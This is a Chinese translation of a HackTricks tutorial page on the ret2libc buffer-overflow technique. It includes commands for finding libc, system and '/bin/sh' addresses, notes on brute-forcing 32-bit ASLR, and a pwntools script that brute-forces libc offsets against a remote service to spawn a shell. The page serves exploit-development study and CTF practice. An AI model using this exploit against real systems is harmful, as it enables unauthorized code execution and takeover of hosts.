# Ret2lib

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## **基本信息**

**Ret2Libc**的本质是将易受攻击的程序的执行流重定向到共享库中的一个函数（例如**system**、**execve**、**strcpy**），而不是在堆栈上执行攻击者提供的shellcode。攻击者构造一个有效负载，修改堆栈上的返回地址，使其指向所需的库函数，同时根据调用约定设置任何必要的参数。

### **示例步骤（简化）**

* 获取要调用的函数的地址（例如system）和要调用的命令（例如/bin/sh）
* 生成一个ROP链，将第一个参数指向命令字符串，并将执行流传递给函数

## 查找地址

* 假设使用的`libc`是当前机器上的一个，您可以找到它将在内存中加载的位置：
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

如果您想检查ASLR是否正在更改libc的地址，可以执行以下操作：
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* 知道使用的 libc 后，还可以通过以下方法找到 `system` 函数的偏移量：
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* 知道使用的libc后，还可以通过以下方法找到字符串 `/bin/sh` 函数的偏移量：
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### 使用 gdb-peda / GEF

知道使用的 libc 后，还可以使用 Peda 或 GEF 来获取 **system** 函数的地址，**exit** 函数的地址以及字符串 **`/bin/sh`** 的地址：
```bash
p system
p exit
find "/bin/sh"
```
### 使用 /proc/\<PID>/maps

如果进程每次与其通信时都会创建**子进程**（网络服务器），尝试**读取**该文件（可能需要使用 root 权限）。

在这里，您可以找到进程内**libc 加载的确切位置**以及**每个子进程将要加载的位置**。

![](<../../../.gitbook/assets/image (853).png>)

在这种情况下，它加载在**0xb75dc000**（这将是 libc 的基地址）

## 未知的 libc

可能您**不知道二进制文件正在加载的 libc**（因为它可能位于您无法访问的服务器上）。在这种情况下，您可以利用漏洞来**泄漏一些地址并找出使用的 libc** 库：

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

您可以在以下位置找到用于此目的的 pwntools 模板：

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

### 使用 2 个偏移量了解 libc

查看页面 [https://libc.blukat.me/](https://libc.blukat.me/) 并使用 libc 中几个函数的地址来找出**使用的版本**。

## 绕过 32 位 ASLR

这些暴力攻击**仅适用于 32 位系统**。

* 如果利用是本地的，您可以尝试暴力破解 libc 的基地址（适用于 32 位系统）：
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* 如果攻击远程服务器，您可以尝试**暴力破解`libc`函数`usleep`的地址**，将10作为参数传递。如果某个时刻**服务器需要额外10秒才能响应**，则找到了该函数的地址。

## One Gadget

执行一个shell，只需跳转到libc中的**一个**特定**地址**：

{% content-ref url="one-gadget.md" %}
[one-gadget.md](one-gadget.md)
{% endcontent-ref %}

## x86 Ret2lib 代码示例

在这个示例中，ASLR暴力破解已集成在代码中，并且易受攻击的二进制文件位于远程服务器上：
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## x64 Ret2lib 代码示例

查看示例：

{% content-ref url="../" %}
[..](../)
{% endcontent-ref %}

## ARM64 Ret2lib 示例

在ARM64的情况下，ret指令跳转到x30寄存器指向的位置，而不是栈寄存器指向的位置。因此，这会变得有点复杂。

此外，在ARM64中，一条指令执行其本身的功能（不可能在指令中间跳转并将其转换为新的指令）。

查看示例：

{% content-ref url="ret2lib-+-printf-leak-arm64.md" %}
[ret2lib-+-printf-leak-arm64.md](ret2lib-+-printf-leak-arm64.md)
{% endcontent-ref %}

## Ret-into-printf（或puts）

这允许通过调用`printf`/`puts`并将特定数据放置为参数来**从进程中泄漏信息**。例如，将`puts`在GOT中的地址放入`puts`的执行中将**泄漏内存中`puts`的地址**。

## Ret2printf

这基本上意味着滥用**Ret2lib将其转换为`printf`格式字符串漏洞**，通过使用`ret2lib`调用printf并使用要利用的值（听起来毫无意义，但是可能）：

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

## 其他示例和参考资料

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)
* Ret2lib，给定libc中函数地址的泄漏，使用一个gadget
* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64位，启用ASLR但没有PIE，第一步是填充溢出直到canary的字节0x00，然后调用puts并泄漏它。使用canary创建ROP gadget来调用puts以从GOT中泄漏puts的地址，然后调用一个ROP gadget来调用`system('/bin/sh')`
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64位，启用ASLR，没有canary，在主函数中由子函数造成的堆栈溢出。ROP gadget调用puts以泄漏GOT中puts的地址，然后调用一个gadget。
* [https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html)
* 64位，没有PIE，没有canary，没有relro，nx。使用write函数泄漏write（libc）的地址并调用一个gadget。
* [https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html)
* 使用格式字符串从堆栈中泄漏canary，并使用缓冲区溢出调用系统（在GOT中）并传递`/bin/sh`的地址。
* [https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html)
* 32位，没有relro，没有canary，nx，pie。滥用错误的索引以从堆栈中泄漏libc和堆地址。滥用缓冲区溢出以调用`system('/bin/sh')`的ret2lib（需要堆地址来绕过检查）。

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在HackTricks中看到您的**公司广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**上关注**我们。
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
